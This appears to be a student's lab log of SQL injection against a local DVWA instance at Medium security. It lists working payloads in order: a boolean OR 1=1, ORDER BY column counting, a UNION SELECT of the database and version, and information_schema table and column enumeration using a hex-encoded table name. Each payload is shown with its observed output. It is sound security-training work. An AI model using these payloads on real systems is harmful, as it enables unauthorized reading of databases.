# Task 9 — SQL Injection Payload Log

## Lab Context

Target: Local DVWA  
URL: http://127.0.0.1:4280/  
Security Level: Medium  
Module: DVWA SQL Injection  
Authorization: Local lab only  

## Baseline Test

Input / selected ID: 1

Observed result:
[ID: 1
First name: admin
Surname: admin]

Evidence:
screenshots/T9_02_SQLi_Baseline_ID1.png

## Notes

No SQL injection payload is marked successful until the actual DVWA response is observed and documented.

## Payload 1 — Boolean OR condition

Payload:
id=1+OR+1=1&Submit=Submit

Interpreted SQL logic:
The plus signs are handled as spaces in URL/form encoding, so the server receives a condition similar to:
1 OR 1=1

Purpose:
Test whether the numeric ID parameter can be modified to make the SQL WHERE condition always true.

Observed result:
The response returned multiple user records instead of only ID 1:
- admin admin
- Gordon Brown
- Hack Me
- Pablo Picasso
- Bob Smith

Why it worked:
The payload changed the filtering logic from selecting a single user ID into selecting rows where ID equals 1 OR the condition 1=1 is true. Since 1=1 is always true, the vulnerable SQL query returned multiple rows.

Evidence:
screenshots/T9_04_SQLi_Payload1_OR_1_EQUALS_1.png

## Payload 2 — Column count using ORDER BY

Payloads tested:
- id=1+ORDER+BY+1&Submit=Submit
- id=1+ORDER+BY+2&Submit=Submit
- id=1+ORDER+BY+3&Submit=Submit

Observed result:
- ORDER BY 1: worked normally.
- ORDER BY 2: worked normally.
- ORDER BY 3: failed with SQL error.

Exact error observed:
Uncaught mysqli_sql_exception: Unknown column '3' in 'ORDER BY' in /var/www/html/vulnerabilities/sqli/source/medium.php:12

Conclusion:
The query likely returns 2 columns because ORDER BY 1 and ORDER BY 2 worked, while ORDER BY 3 failed.

Why it matters:
Before using UNION-based SQL injection, the tester must identify how many columns the original query returns. The UNION SELECT statement must return the same number of columns as the original query.

Evidence:
screenshots/T9_05_Column_Count_ORDER_BY.png

## Payload 3 — UNION SELECT database and version

Payload:
id=1+UNION+SELECT+database(),version()&Submit=Submit

Purpose:
Test whether UNION-based SQL injection works after confirming that the original query returns 2 columns.

Observed result:
[ID: 1 UNION SELECT database(),version()<br />First name: dvwa<br />Surname: 10.11.19-MariaDB-ubu2204]

Why it worked:
The original query returns 2 columns, so the injected UNION SELECT also used 2 columns. This allowed database metadata to appear inside the normal application response.

Evidence:
screenshots/T9_06_UNION_Database_Version.png

## Payload 4 — Table enumeration

Payload:
id=1+UNION+SELECT+group_concat(table_name),2+FROM+information_schema.tables+WHERE+table_schema=database()&Submit=Submit

Purpose:
Enumerate table names from the current DVWA database using information_schema.tables.

Observed result:
[ID: 1 UNION SELECT group_concat(table_name),2 FROM information_schema.tables WHERE table_schema=database()<br />First name: guestbook,access_log,users,security_log<br />]

Why it worked:
The payload queries information_schema.tables for tables where table_schema equals the current database name. group_concat combines the table names into one visible output field.

Evidence:
screenshots/T9_07_Table_Enumeration.png

## Payload 5 — Column enumeration from users table

Payload:
id=1+UNION+SELECT+group_concat(column_name),2+FROM+information_schema.columns+WHERE+table_schema=database()+AND+table_name=0x7573657273&Submit=Submit

Purpose:
Enumerate column names from the users table using information_schema.columns.

Observed result:
The response returned the following users table columns:
- user_id
- first_name
- last_name
- user
- password
- avatar
- last_login
- failed_login
- role
- account_enabled

Why it worked:
After identifying the users table, the payload queried information_schema.columns for columns belonging to that table. The table name was represented as hexadecimal to avoid quote-handling issues in the injected SQL.

Evidence:
screenshots/T9_08_Column_Enumeration_Users.png

## Authentication-bypass requirement handling

Official requirement interpretation:
The Task 9 card mentions bypassing login authentication. In this local DVWA Medium execution, the tested module was the DVWA SQL Injection module, where the controllable parameter was the user ID selection/input, not the main DVWA login form.

What was actually demonstrated:
Payload 1 demonstrated a boolean-condition bypass of the normal record-selection logic. Instead of returning only ID 1, the application returned multiple user records when the condition `1 OR 1=1` was injected.

Evidence:
screenshots/T9_04_SQLi_Payload1_OR_1_EQUALS_1.png

Honest limitation:
No real authentication bypass against the DVWA login page was claimed. The completed evidence demonstrates SQL injection impact through unauthorized expansion of returned database records inside the authorized DVWA SQL Injection module.
